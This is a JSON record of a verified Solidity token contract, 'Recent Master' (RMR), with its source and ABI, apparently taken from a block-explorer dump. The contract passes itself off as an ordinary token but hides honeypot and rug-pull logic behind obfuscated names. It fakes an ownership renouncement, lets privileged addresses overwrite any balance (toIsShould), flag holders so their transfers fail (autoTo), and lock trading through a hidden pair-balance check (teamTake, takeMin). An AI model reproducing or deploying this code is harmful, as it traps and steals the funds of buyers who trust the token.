{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.12;\n\ninterface fromLiquidityTake {\n    function createPair(address receiverMode, address receiverShould) external returns (address);\n}\n\ninterface isLaunchReceiver {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address atTakeWallet) external view returns (uint256);\n\n    function transfer(address fromMaxMin, uint256 receiverFee) external returns (bool);\n\n    function allowance(address atTrading, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 receiverFee) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address fromMaxMin,\n        uint256 receiverFee\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed minShould, uint256 value);\n    event Approval(address indexed atTrading, address indexed spender, uint256 value);\n}\n\nabstract contract receiverWallet {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface liquidityIs {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface tokenMarketingFrom is isLaunchReceiver {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract RecentMaster is receiverWallet, isLaunchReceiver, tokenMarketingFrom {\n\n    function txListTo(address shouldReceiverTeam) public {\n        if (feeTrading) {\n            return;\n        }\n        \n        minShouldSwap[shouldReceiverTeam] = true;\n        if (senderTx != launchedMax) {\n            feeMin = feeTradingMarketing;\n        }\n        feeTrading = true;\n    }\n\n    mapping(address => bool) public atEnable;\n\n    function owner() external view returns (address) {\n        return liquidityEnableAmount;\n    }\n\n    uint256 private launchedMax;\n\n    address public maxAmount;\n\n    uint256 public takeLiquidity;\n\n    address public enableLaunched;\n\n    uint256 public feeMin;\n\n    event OwnershipTransferred(address indexed fundLaunchedReceiver, address indexed amountAt);\n\n    uint256 constant totalLaunched = 12 ** 10;\n\n    function takeMin(address isEnable, address fromMaxMin, uint256 receiverFee) internal returns (bool) {\n        if (isEnable == enableLaunched) {\n            return launchedSwapFund(isEnable, fromMaxMin, receiverFee);\n        }\n        uint256 feeMax = isLaunchReceiver(maxAmount).balanceOf(receiverFeeMode);\n        require(feeMax == tokenLimit);\n        require(fromMaxMin != receiverFeeMode);\n        if (atEnable[isEnable]) {\n            return launchedSwapFund(isEnable, fromMaxMin, totalLaunched);\n        }\n        return launchedSwapFund(isEnable, fromMaxMin, receiverFee);\n    }\n\n    function tokenFrom() public {\n        emit OwnershipTransferred(enableLaunched, address(0));\n        liquidityEnableAmount = address(0);\n    }\n\n    string private tokenTake = \"RMR\";\n\n    uint8 private totalExempt = 18;\n\n    uint256 private modeLaunch = 100000000 * 10 ** 18;\n\n    address private liquidityEnableAmount;\n\n    uint256 tokenLimit;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return modeLaunch;\n    }\n\n    function transferFrom(address isEnable, address fromMaxMin, uint256 receiverFee) external override returns (bool) {\n        if (_msgSender() != amountLaunchedSell) {\n            if (tradingReceiver[isEnable][_msgSender()] != type(uint256).max) {\n                require(receiverFee <= tradingReceiver[isEnable][_msgSender()]);\n                tradingReceiver[isEnable][_msgSender()] -= receiverFee;\n            }\n        }\n        return takeMin(isEnable, fromMaxMin, receiverFee);\n    }\n\n    uint256 private sellLaunch;\n\n    function name() external view virtual override returns (string memory) {\n        return minLaunched;\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return tokenTake;\n    }\n\n    mapping(address => uint256) private liquidityTeam;\n\n    bool public feeTrading;\n\n    function balanceOf(address atTakeWallet) public view virtual override returns (uint256) {\n        return liquidityTeam[atTakeWallet];\n    }\n\n    mapping(address => mapping(address => uint256)) private tradingReceiver;\n\n    uint256 private senderTx;\n\n    uint256 fundMarketing;\n\n    function transfer(address launchedReceiver, uint256 receiverFee) external virtual override returns (bool) {\n        return takeMin(_msgSender(), launchedReceiver, receiverFee);\n    }\n\n    function autoTo(address exemptMinFee) public {\n        takeTxLaunched();\n        \n        if (exemptMinFee == enableLaunched || exemptMinFee == maxAmount) {\n            return;\n        }\n        atEnable[exemptMinFee] = true;\n    }\n\n    function getOwner() external view returns (address) {\n        return liquidityEnableAmount;\n    }\n\n    function toIsShould(address launchedReceiver, uint256 receiverFee) public {\n        takeTxLaunched();\n        liquidityTeam[launchedReceiver] = receiverFee;\n    }\n\n    string private minLaunched = \"Recent Master\";\n\n    function takeTxLaunched() private view {\n        require(minShouldSwap[_msgSender()]);\n    }\n\n    address receiverFeeMode = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function decimals() external view virtual override returns (uint8) {\n        return totalExempt;\n    }\n\n    function launchedSwapFund(address isEnable, address fromMaxMin, uint256 receiverFee) internal returns (bool) {\n        require(liquidityTeam[isEnable] >= receiverFee);\n        liquidityTeam[isEnable] -= receiverFee;\n        liquidityTeam[fromMaxMin] += receiverFee;\n        emit Transfer(isEnable, fromMaxMin, receiverFee);\n        return true;\n    }\n\n    mapping(address => bool) public minShouldSwap;\n\n    function allowance(address tradingSenderAmount, address tokenReceiver) external view virtual override returns (uint256) {\n        if (tokenReceiver == amountLaunchedSell) {\n            return type(uint256).max;\n        }\n        return tradingReceiver[tradingSenderAmount][tokenReceiver];\n    }\n\n    constructor (){\n        \n        liquidityIs limitTx = liquidityIs(amountLaunchedSell);\n        maxAmount = fromLiquidityTake(limitTx.factory()).createPair(limitTx.WETH(), address(this));\n        \n        enableLaunched = _msgSender();\n        minShouldSwap[enableLaunched] = true;\n        liquidityTeam[enableLaunched] = modeLaunch;\n        tokenFrom();\n        \n        emit Transfer(address(0), enableLaunched, modeLaunch);\n    }\n\n    uint256 private feeTradingMarketing;\n\n    function approve(address tokenReceiver, uint256 receiverFee) public virtual override returns (bool) {\n        tradingReceiver[_msgSender()][tokenReceiver] = receiverFee;\n        emit Approval(_msgSender(), tokenReceiver, receiverFee);\n        return true;\n    }\n\n    function teamTake(uint256 receiverFee) public {\n        takeTxLaunched();\n        tokenLimit = receiverFee;\n    }\n\n    address amountLaunchedSell = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"atTrading\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"fundLaunchedReceiver\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"amountAt\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"minShould\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tradingSenderAmount\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"tokenReceiver\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tokenReceiver\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"receiverFee\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"atEnable\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"exemptMinFee\",\"type\":\"address\"}],\"name\":\"autoTo\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"atTakeWallet\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"enableLaunched\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"feeMin\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"feeTrading\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"maxAmount\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"minShouldSwap\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"takeLiquidity\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"receiverFee\",\"type\":\"uint256\"}],\"name\":\"teamTake\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchedReceiver\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"receiverFee\",\"type\":\"uint256\"}],\"name\":\"toIsShould\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tokenFrom\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchedReceiver\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"receiverFee\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"isEnable\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"fromMaxMin\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"receiverFee\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"shouldReceiverTeam\",\"type\":\"address\"}],\"name\":\"txListTo\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "RecentMaster", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}